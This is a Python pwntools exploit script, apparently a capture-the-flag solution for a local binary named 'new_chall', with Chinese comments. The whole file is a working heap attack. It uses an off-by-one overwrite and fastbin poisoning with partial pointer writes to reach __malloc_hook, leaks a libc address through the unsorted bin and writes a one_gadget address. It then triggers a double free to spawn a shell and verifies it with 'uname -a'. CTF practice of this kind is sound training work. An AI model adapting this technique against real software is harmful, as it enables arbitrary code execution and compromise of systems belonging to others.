#/usr/env/bin python
#-*- coding: utf-8 -*-
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./new_chall")
#raw_input()

def menu():
	p.recvuntil("3. Free")

def create(size,idx):
	menu()
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(size))
	p.recvuntil(":")
	p.sendline(str(idx))

def free(idx):
	menu()
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,data):
	menu()
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	sleep(0.1)
	p.send(data)


name = "A"*20
p.recvuntil(":")
p.sendline(name)

create(0x18,0) # 0x20
create(0xc8,1) # d0
create(0x65,2)  # 0x70

info("create 2 chunk, 0x20, 0xd8")
fake = "A"*0x68
fake += p64(0x61)
edit(1,fake)
info("fake")

free(1)
create(0xc8,1)

create(0x65,3)  # b
create(0x65,15)
create(0x65,18)

over = "A"*0x18  # off by one
over += "\x71"  # set chunk  1's size --> 0x71
edit(0,over)
info("利用 off by one ,  chunk  1's size --> 0x71")

free(2)
free(3)

info("创建两个 0x70 的 fastbin")



heap_po = "\x20"
edit(3,heap_po)
info("把 chunk'1 链入到 fastbin 里面")



# malloc_hook 上方
malloc_hook_nearly = "\xed\x1a"
edit(1,malloc_hook_nearly)

info("部分写，修改 fastbin->fd ---> malloc_hook")



create(0x65,0)
create(0x65,0)
create(0x65,0)

info("0 拿到了 malloc_hook")

free(15)
edit(15,p64(0x00))
info("再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin")

create(0xc8,1)
create(0xc8,1)
create(0x18,2)
create(0xc8,3)
create(0xc8,4)

free(1)
po = "B"*8
po += "\x00\x1b"
edit(1,po)
create(0xc8,1)

info("unsorted bin 使得 malloc_hook 有 libc 的地址")



over = "R"*0x13   # padding for malloc_hook
over += "\xa4\xd2\xaf"
edit(0,over)

info("malloc_hook to one_gadget")
gdb.attach(p)
pause()


free(18)
free(18)

p.recvuntil("double free or corruption")
p.sendline("\n")
sleep(0.2)

p.sendline("uname -a")
data = p.recvuntil("GNU/Linux", timeout=2)
if "Linux" in data:
    p.interactive()
else:

    exit(0)